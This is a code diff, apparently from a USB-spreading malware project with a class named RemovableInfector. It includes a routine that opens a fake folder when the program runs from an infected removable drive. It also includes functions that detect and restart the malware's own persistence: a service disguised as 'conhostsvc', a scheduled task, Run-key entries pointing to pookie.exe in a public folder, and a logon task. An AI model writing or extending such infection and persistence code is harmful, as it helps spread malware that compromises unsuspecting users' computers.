@@ -1,5 +1,4 @@
 ﻿using IWshRuntimeLibrary;
-using Microsoft.Win32.TaskScheduler;
 using System;
 using System.Diagnostics;
 using System.IO;
@@ -7,7 +6,6 @@ using System.Linq;
 using System.Management;
 using System.Security.AccessControl;
 using System.Security.Principal;
-using System.ServiceProcess;
 using File = System.IO.File;
 
 namespace zort
@@ -401,7 +399,7 @@ namespace zort
         public static void OpenFakeFolderIfRunningFromInfectedUsb()
         {
             // Check if the current process is running from a removable drive
-            if(!IsRunningFromInfectedUsb()) return;
+            if (!IsRunningFromInfectedUsb()) return;
             string currentPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
             string parentFolder = Directory.GetParent(Path.GetDirectoryName(currentPath)).FullName;
             if (parentFolder != null)
@@ -411,90 +409,26 @@ namespace zort
             }
         }
 
-        public static bool IsSystemInfectedx()
-        {
-            const string serviceName = "conhostsvc";
-            try
-            {
-                // Check if conhostsvc exists
-                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
-                if (service != null)
-                {
-                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Service exists.");
-                    // Service exists
-                    ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} exists. System is infected.");
-
-                    //Start service if not already running
-                    var serviceController = new System.ServiceProcess.ServiceController(serviceName);
-                    if (serviceController.Status != System.ServiceProcess.ServiceControllerStatus.Running)
-                    {
-                        serviceController.Start();
-                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} started.");
-                    }
-                    else
-                    {
-                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} is already running.");
-                    }
-
-                    return true;
-                }
-                else return false;
-
-            }
-            catch (Exception ex)
-            {
-                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
-                return false;
-            }
-        }
-
         public static bool IsSystemInfected()
         {
-            // Check task scheduler for a task named IPookieBearUWU
-            try
+            if (ServiceHelper.IsServiceInstalled())
             {
-                var taskService = new TaskService();
-                var task = taskService.GetTask("IPookieBearUWU");
-                if (task != null)
+                return true;
+            }
+            else if (PookieHelper.PookieExists())
+            {
+                if (PookieHelper.IsPookieRunning())
                 {
-                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Task exists.");
+                    return true;
+                }
+                else if (PookieHelper.Tasks.StartAtLogon.Exists())
+                {
                     return true;
                 }
             }
-            catch (Exception ex)
-            {
-                ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
-                return false;
-            }
 
             return false;
         }
 
-
-        public static bool IsSystemInfectedss()
-        {
-            //Enumerate reg run keys and find the one that runs C:\Users\Public\Pictures\pookie.exe
-            string[] runKeys = { @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run" };
-            foreach (string runKey in runKeys)
-            {
-                using (var registryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey))
-                {
-                    if (registryKey != null)
-                    {
-                        foreach (string valueName in registryKey.GetValueNames())
-                        {
-                            string value = registryKey.GetValue(valueName)?.ToString();
-                            if (value != null && value.Contains("pookie.exe"))
-                            {
-                                ModuleLogger.Log(typeof(RemovableInfector), $"System is infected. Found registry key: {runKey}");
-                                return true;
-                            }
-                        }
-                    }
-                }
-            }
-
-            return false;
-        }
     }
 }
